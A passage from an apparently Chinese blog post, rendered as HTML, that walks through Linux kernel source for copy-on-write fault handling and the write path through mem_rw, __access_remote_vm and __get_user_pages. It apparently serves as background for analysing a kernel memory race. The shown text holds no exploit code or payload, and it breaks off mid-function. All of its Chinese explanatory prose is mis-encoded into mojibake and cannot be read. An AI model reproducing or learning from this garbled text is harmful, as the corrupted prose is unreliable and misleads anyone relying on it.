address, page_table, pmd,</span><br><span class="line">				    orig_pte, old_page);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Take out anonymous pages first, anonymous shared vmas are</span></span><br><span class="line"><span class="comment">	 * not dirty accountable.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (PageAnon(old_page) &amp;&amp; !PageKsm(old_page)) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!trylock_page(old_page)) &#123;</span><br><span class="line">			page_cache_get(old_page);</span><br><span class="line">			pte_unmap_unlock(page_table, ptl);</span><br><span class="line">			lock_page(old_page);</span><br><span class="line">			page_table = pte_offset_map_lock(mm, pmd, address,</span><br><span class="line">							 &amp;ptl);</span><br><span class="line">			<span class="keyword">if</span> (!pte_same(*page_table, orig_pte)) &#123;</span><br><span class="line">				unlock_page(old_page);</span><br><span class="line">				pte_unmap_unlock(page_table, ptl);</span><br><span class="line">				page_cache_release(old_page);</span><br><span class="line">				<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			page_cache_release(old_page);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (reuse_swap_page(old_page)) &#123;</span><br><span class="line">			<span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * The page is all ours.  Move it to our anon_vma so</span></span><br><span class="line"><span class="comment">			 * the rmap code will not search our parent or siblings.</span></span><br><span class="line"><span class="comment">			 * Protected against the rmap code by the page lock.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			page_move_anon_rmap(old_page, vma, address);</span><br><span class="line">			unlock_page(old_page);</span><br><span class="line">			<span class="keyword">return</span> wp_page_reuse(mm, vma, address, page_table, ptl,</span><br><span class="line">					     orig_pte, old_page, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		unlock_page(old_page);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (unlikely((vma-&gt;vm_flags &amp; (VM_WRITE|VM_SHARED)) ==</span><br><span class="line">					(VM_WRITE|VM_SHARED))) &#123;</span><br><span class="line">		<span class="keyword">return</span> wp_page_shared(mm, vma, address, page_table, pmd,</span><br><span class="line">				      ptl, orig_pte, old_page);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Ok, we need to copy. Oh, well..</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	page_cache_get(old_page);</span><br><span class="line"></span><br><span class="line">	pte_unmap_unlock(page_table, ptl);</span><br><span class="line">	<span class="keyword">return</span> wp_page_copy(mm, vma, address, page_table, pmd,</span><br><span class="line">			    orig_pte, old_page);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆé€šè¿‡<code>old_page = vm_normal_page(vma, address, orig_pte);</code>è·å–ç¼ºé¡µçš„çº¿æ€§åœ°å€å¯¹åº”çš„<code>struct page</code>ç»“æ„ï¼Œå¯¹äºä¸€äº›ç‰¹æ®Šæ˜ å°„çš„é¡µé¢ï¼ˆå¦‚é¡µé¢å›æ”¶ã€é¡µè¿ç§»å’ŒKSMç­‰ï¼‰ï¼Œå†…æ ¸å¹¶ä¸å¸Œæœ›è¿™äº›é¡µå‚ä¸åˆ°å†…å­˜ç®¡ç†çš„ä¸€äº›æµç¨‹å½“ä¸­ï¼Œç§°ä¹‹ä¸º<code>special mapping</code>ï¼Œå¹¶æ— å¯¹åº”çš„<code>struct page</code>ç»“æ„ä½“ã€‚</p>
<p>ç´§æ¥ç€åˆ¤æ–­æ˜¯å¦ä¸º<code>special mapping</code>ï¼Œå¦‚æœæ˜¯åˆ™ä¼šè¿›å…¥ifåˆ†æ”¯ï¼Œå½“ç„¶æˆ‘ä»¬è¿™é‡Œä¸æ˜¯ã€‚</p>
<p>éšååˆ¤æ–­é¡µé¢æ˜¯å¦ä¸ºåŒ¿åé¡µå¹¶ä¸”ä¸ä¸ºKSMï¼Œå¦‚æœæˆç«‹å¹¶ä¸”å¯ä»¥æˆåŠŸä¸Šé”åˆ™è¿›å…¥ä»¥ä¸‹è¯­å¥ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (reuse_swap_page(old_page)) &#123;</span><br><span class="line">  page_move_anon_rmap(old_page, vma, address);</span><br><span class="line">  unlock_page(old_page);</span><br><span class="line">  <span class="keyword">return</span> wp_page_reuse(mm, vma, address, page_table, ptl,</span><br><span class="line">                       orig_pte, old_page, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­é¦–å…ˆé€šè¿‡<code>reuse_swap_page</code>åˆ¤æ–­æ˜¯å¦åªæœ‰ä¸€ä¸ªè¿›ç¨‹åœ¨ä½¿ç”¨è¯¥é¡µï¼Œå¦‚æœæ˜¯åˆ™ç›´æ¥è°ƒç”¨<code>wp_page_reuse</code>å‡½æ•°é‡ç”¨è¯¥é¡µã€‚å¦‚æœä»¥ä¸Šçš„æ‰€æœ‰éƒ½æ²¡æ»¡è¶³åˆ™è¿›å…¥æœ€åçš„æ— æ³•é‡ç”¨è¿›è¡Œå†™æ—¶å¤åˆ¶ã€‚</p>
<p>é‚£ä¹ˆä»¥ä¸Šå°±æ˜¯COWçš„å…¨éƒ¨æµç¨‹äº†ï¼Œæ¥ä¸‹æ¥åˆ†æä¸€ä¸‹<code>write</code>å‡½æ•°ã€‚</p>
<h3 id="writeå‡½æ•°åˆ†æ"><a href="#writeå‡½æ•°åˆ†æ" class="headerlink" title="writeå‡½æ•°åˆ†æ"></a>writeå‡½æ•°åˆ†æ</h3><p>å…·ä½“æµç¨‹å…¶å®å°±æ˜¯ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sys_write() =&gt; vfs_write() =&gt; __vfs_write() =&gt; file-&gt;f_op-&gt;write() =&gt; mem_write() =&gt; mem_rw()</span><br></pre></td></tr></table></figure>

<h4 id="mem-rw"><a href="#mem-rw" class="headerlink" title="mem_rw"></a><strong>mem_rw</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">mem_rw</span><span class="params">(struct file *file, <span class="keyword">char</span> __user *buf,</span></span></span><br><span class="line"><span class="params"><span class="function">			<span class="keyword">size_t</span> count, <span class="keyword">loff_t</span> *ppos, <span class="keyword">int</span> write)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> file-&gt;private_data;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> addr = *ppos;</span><br><span class="line">	<span class="keyword">ssize_t</span> copied;</span><br><span class="line">	<span class="keyword">char</span> *page;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!mm)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	page = (<span class="keyword">char</span> *)__get_free_page(GFP_TEMPORARY);</span><br><span class="line">	<span class="keyword">if</span> (!page)</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">	copied = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (!atomic_inc_not_zero(&amp;mm-&gt;mm_users))</span><br><span class="line">		<span class="keyword">goto</span> <span class="built_in">free</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (count &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">int</span> this_len = <span class="keyword">min_t</span>(<span class="keyword">int</span>, count, PAGE_SIZE);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (write &amp;&amp; copy_from_user(page, buf, this_len)) &#123;</span><br><span class="line">			copied = -EFAULT;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		this_len = access_remote_vm(mm, addr, page, this_len, write);</span><br><span class="line">		<span class="keyword">if</span> (!this_len) &#123;</span><br><span class="line">			<span class="keyword">if</span> (!copied)</span><br><span class="line">				copied = -EIO;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!write &amp;&amp; copy_to_user(buf, page, this_len)) &#123;</span><br><span class="line">			copied = -EFAULT;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		buf += this_len;</span><br><span class="line">		addr += this_len;</span><br><span class="line">		copied += this_len;</span><br><span class="line">		count -= this_len;</span><br><span class="line">	&#125;</span><br><span class="line">	*ppos = addr;</span><br><span class="line"></span><br><span class="line">	mmput(mm);</span><br><span class="line"><span class="built_in">free</span>:</span><br><span class="line">	free_page((<span class="keyword">unsigned</span> <span class="keyword">long</span>) page);</span><br><span class="line">	<span class="keyword">return</span> copied;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œçš„æµç¨‹è¿˜æ˜¯å¬æ¸…æ™°çš„ï¼Œé¦–å…ˆå°±æ˜¯è·å–ä¸€ä¸ªä¸´æ—¶çš„å†…å­˜é¡µï¼Œç´§æ¥ç€å°†ç”¨æˆ·ç©ºé—´çš„å†…å®¹æ”¾åˆ°ä¸´æ—¶çš„å†…å­˜é¡µä¸­å³å¯ï¼Œæ¥ç€åˆ©ç”¨<code>access_remote_vm</code>å‡½æ•°è®¿é—®å†…å­˜ï¼Œç„¶ååé¢æ˜¯å¦‚æœä¸æ˜¯å†™çš„è¯å°±è¿”å›å†…å®¹åˆ°ç”¨æˆ·ç©ºé—´ï¼Œæœ€åé‡Šæ”¾ä¸´æ—¶å†…å­˜é¡µã€‚</p>
<h4 id="access-remote-vm"><a href="#access-remote-vm" class="headerlink" title="access_remote_vm"></a><strong>access_remote_vm</strong></h4><p><code>access_remote_vm</code>å‡½æ•°å…¶å®å°±æ˜¯<code>__access_remote_vm</code>ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __access_remote_vm(struct task_struct *tsk, struct mm_struct *mm,</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">long</span> addr, <span class="keyword">void</span> *buf, <span class="keyword">int</span> len, <span class="keyword">int</span> write)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">vma</span>;</span></span><br><span class="line">	<span class="keyword">void</span> *old_buf = buf;</span><br><span class="line"></span><br><span class="line">	down_read(&amp;mm-&gt;mmap_sem);</span><br><span class="line">	<span class="comment">/* ignore errors, just check how much was successfully transferred */</span></span><br><span class="line">	<span class="keyword">while</span> (len) &#123;</span><br><span class="line">		<span class="keyword">int</span> bytes, ret, offset;</span><br><span class="line">		<span class="keyword">void</span> *maddr;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">		ret = get_user_pages(tsk, mm, addr, <span class="number">1</span>,</span><br><span class="line">				write, <span class="number">1</span>, &amp;page, &amp;vma);</span><br><span class="line">		<span class="keyword">if</span> (ret &lt;= <span class="number">0</span>) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CONFIG_HAVE_IOREMAP_PROT</span></span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">			<span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * Check if this is a VM_IO | VM_PFNMAP VMA, which</span></span><br><span class="line"><span class="comment">			 * we can access using slightly different code.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			vma = find_vma(mm, addr);</span><br><span class="line">			<span class="keyword">if</span> (!vma || vma-&gt;vm_start &gt; addr)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">if</span> (vma-&gt;vm_ops &amp;&amp; vma-&gt;vm_ops-&gt;access)</span><br><span class="line">				ret = vma-&gt;vm_ops-&gt;access(vma, addr, buf,</span><br><span class="line">							  len, write);</span><br><span class="line">			<span class="keyword">if</span> (ret &lt;= <span class="number">0</span>)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			bytes = ret;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			bytes = len;</span><br><span class="line">			offset = addr &amp; (PAGE_SIZE<span class="number">-1</span>);</span><br><span class="line">			<span class="keyword">if</span> (bytes &gt; PAGE_SIZE-offset)</span><br><span class="line">				bytes = PAGE_SIZE-offset;</span><br><span class="line"></span><br><span class="line">			maddr = kmap(page);</span><br><span class="line">			<span class="keyword">if</span> (write) &#123;</span><br><span class="line">				copy_to_user_page(vma, page, addr,</span><br><span class="line">						  maddr + offset, buf, bytes);</span><br><span class="line">				set_page_dirty_lock(page);</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				copy_from_user_page(vma, page, addr,</span><br><span class="line">						    buf, maddr + offset, bytes);</span><br><span class="line">			&#125;</span><br><span class="line">			kunmap(page);</span><br><span class="line">			page_cache_release(page);</span><br><span class="line">		&#125;</span><br><span class="line">		len -= bytes;</span><br><span class="line">		buf += bytes;</span><br><span class="line">		addr += bytes;</span><br><span class="line">	&#125;</span><br><span class="line">	up_read(&amp;mm-&gt;mmap_sem);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> buf - old_buf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œé€šè¿‡<code>ret = get_user_pages(tsk, mm, addr, 1, write, 1, &amp;page, &amp;vma);</code>è·å–åˆ°å¯¹åº”ç›®æ ‡çš„å†…å­˜é¡µã€‚ç„¶åé€šè¿‡<code>maddr = kmap(page);</code>å»ºç«‹æ˜ å°„ï¼Œæœ€ååœ¨<code>copy_to_user_page(vma, page, addr, maddr + offset, buf, bytes);</code>ä¸­å†™å…¥ã€‚</p>
<p>é‚£ä¹ˆå…¶ä¸­æœ€ä¸ºé‡è¦çš„å³ä¸º<code>get_user_pages</code>å‡½æ•°</p>
<h4 id="get-user-pages"><a href="#get-user-pages" class="headerlink" title="__get_user_pages"></a><strong>__get_user_pages</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">long</span> __get_user_pages(struct task_struct *tsk, struct mm_struct *mm,</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">long</span> start, <span class="keyword">unsigned</span> <span class="keyword">long</span> nr_pages,</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">int</span> gup_flags, struct page **pages,</span><br><span class="line">		struct vm_area_struct **vmas, <span class="keyword">int</span> *nonblocking)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">long</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> page_mask;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">vma</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!nr_pages)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	VM_BUG_ON(!!pages != !!(gup_flags &amp; FOLL_GET));</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If FOLL_FORCE is set then do not force a full fault as the hinting</span></span><br><span class="line"><span class="comment">	 * fault information is unrelated to the reference behaviour of a task</span></span><br><span class="line"><span class="comment">	 * using the address space</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (!(gup_flags &amp; FOLL_FORCE))</span><br><span class="line">		gup_flags |= FOLL_NUMA;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">do</span> &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">int</span> foll_flags = gup_flags;</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">int</span> page_increm;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* first iteration or cross vma bound */</span></span><br><span class="line">		<span class="keyword">if</span> (!vma || start &gt;= vma-&gt;vm_end) &#123;</span><br><span class="line">			vma = find_extend_vma(mm, start);</span><br><span class="line">			<span class="keyword">if</span> (!vma &amp;&amp; in_gate_area(mm, start)) &#123;</span><br><span class="line">				<span class="keyword">int</span> ret;</span><br><span class="line">				ret = get_gate_page(mm, start &amp; PAGE_MASK,</span><br><span class="line">						gup_flags, &amp;vma,</span><br><span class="line">						pages ? &amp;pages[i] : <span class="literal">NULL</span>);</span><br><span class="line">				<span class="keyword">if</span> (ret)</span><br><span class="line">					<span class="keyword">return</span> i ? : ret;</span><br><span class="line">				page_mask = <span class="number">0</span>;</span><br><span class="line">				<span class="keyword">goto</span> next_page;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (!vma || check_vma_flags(vma, gup_flags))</span><br><span class="line">				<span class="keyword">return</span> i ? : -EFAULT;</span><br><span class="line">			<span class="keyword">if</span> (is_vm_hugetlb_page(vma)) &#123;</span><br><span class="line">				i = follow_hugetlb_page(mm, vma, pages, vmas,</span><br><span class="line">						&amp;start, &amp;nr_pages, i,</span><br><span class="line">						gup_flags);</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">retry:</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * If we have a pending SIGKILL, don&#x27;t keep faulting pages and</span></span><br><span class="line"><span class="comment">		 * potentially allocating memory.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">if</span> (unlikely(fatal_signal_pending(current)))</span><br><span class="line">			<span class="keyword">return</span> i ? i : -ERESTARTSYS;</span><br><span class="line">		cond_resched();</span><br><span class="line">      page = follow_page_mask(vma, start, foll_flags, &amp;page_mask);</span><br><span class="line">		<span class="keyword">if</span> (!page) &#123;</span><br><span class="line">			<span class="keyword">int</span> ret;</span><br><span class="line">			ret = faultin_page(tsk, vma, start, &amp;foll_flags,</span><br><span class="line">					nonblocking);</span><br><span class="line">			<span class="keyword">switch</span> (ret) &#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">				<span class="keyword">goto</span> retry;</span><br><span class="line">			<span class="keyword">case</span> -EFAULT:</span><br><span class="line">			<span class="keyword">case</span> -ENOMEM:</span><br><span class="line">			<span class="keyword">case</span> -EHWPOISON:</span><br><span class="line">				<span class="keyword">return</span> i ? i : ret;</span><br><span class="line">			<span class="keyword">case</span> -EBUSY:</span><br><span class="line">				<span class="keyword">return</span> i;</span><br><span class="line">			<span class="keyword">case</span> -ENOENT:</span><br><span class="line">				<span class="keyword">goto</span> next_page;</span><br><span class="line">			&#125;</span><br><span class="line">			BUG();</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (PTR_ERR(page) == -EEXIST) &#123;</span><br><span class="line">			<span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * Proper page table entry exists, but no corresponding</span></span><br><span class="line"><span class="comment">			 * struct page.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			<span class="keyword">goto</span> next_page;</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (IS_ERR(page)) &#123;</span><br><span class="line">			<span class="keyword">return</span> i ? i : PTR_ERR(page);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (pages) &#123;</span><br><span class="line">			pages[i] = page;</span><br><span class="line">			flush_anon_page(vma, page, start);</span><br><span class="line">			flush_dcache_page(page);</span><br><span class="line">			page_mask = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">next_page:</span><br><span class="line">		<span class="keyword">if</span> (vmas) &#123;</span><br><span class="line">			vmas[i] = vma;</span><br><span class="line">			page_mask = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		page_increm = <span class="number">1</span> + (~(start &gt;&gt; PAGE_SHIFT) &amp; page_mask);</span><br><span class="line">		<span class="keyword">if</span> (page_increm &gt; nr_pages)</span><br><span class="line">			page_increm = nr_pages;</span><br><span class="line">		i += page_increm;</span><br><span class="line">		start += page_increm * PAGE_SIZE;</span><br><span class="line">		nr_pages -= page_increm;</span><br><span class="line">	&#125; <span class="keyword">while</span> (nr_pages);</span><br><span class="line">	<span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(__get_user_pages);</span><br></pre></td></tr></table></figure>

<p>æœ€å¼€å§‹å°±æ˜¯å¯¹vmaçš„ä¸€äº›æ“ä½œï¼Œæˆ‘ä»¬éœ€è¦æ³¨æ„çš„æ˜¯<code>retry</code>ä¹‹åçš„å†…å®¹ã€‚å¯ä»¥çœ‹å‡ºæ¥çš„æ˜¯<code>follow_page_mask</code>å‡½æ•°è¿”å›çš„æ˜¯ç‰©ç†é¡µé¢ï¼Œè€Œä¸”<code>faultin_page</code>å‡½æ•°ä¸­ä¼šè°ƒç”¨<code>handle_mm_fault</code>ã€‚</p>
<p>é‚£ä¹ˆæˆ‘ä»¬åœ¨ç¬¬ä¸€æ¬¡å¾€ä¸€ä¸ªæ–‡ä»¶ä¸­å†™å…¥å†…å®¹æ—¶ä¼šå› ä¸ºLinuxçš„å»¶è¿Ÿç»‘å®šæœºåˆ¶å¯¼è‡´è¯¥é¡µè¿˜æœªå’Œå¯¹åº”çš„ç‰©ç†é¡µå»ºç«‹æ˜ å°„ï¼Œé‚£ä¹ˆæ­¤æ—¶<code>follow_page_mask</code>å‡½æ•°è¿”å›çš„åˆ™æ˜¯NULLï¼Œéšå³è¿›å…¥ç¬¬ä¸€ä¸ª<code>faultin_page</code>å‡½æ•°ï¼Œæ ¹æ®å‰é¢çš„åˆ†æï¼Œè¿™ä¸€æ¬¡è§£å†³å®Œæ¯•ä¹‹åï¼Œä¼šåˆ†é…ç‰©ç†é¡µã€‚é‚£ä¹ˆè¿™é‡Œç»è¿‡<code>retry</code>å†ä¸€æ¬¡æ‰§è¡Œ<code>follow_page_mask</code>ï¼Œä¸è¿‡å› ä¸ºé¡µé¢ä¸å¯å†™å†ä¸€æ¬¡å¯¼è‡´è¿”å›çš„å€¼ä¸ºNULLï¼Œéšå³è¿›è¡Œç¬¬äºŒæ¬¡<code>faultin_page</code>å‡½æ•°ï¼Œè¿›è¡Œå†™æ—¶å¤åˆ¶ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">faultin_page</span><span class="params">(struct task_struct *tsk, struct vm_area_struct *vma,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span 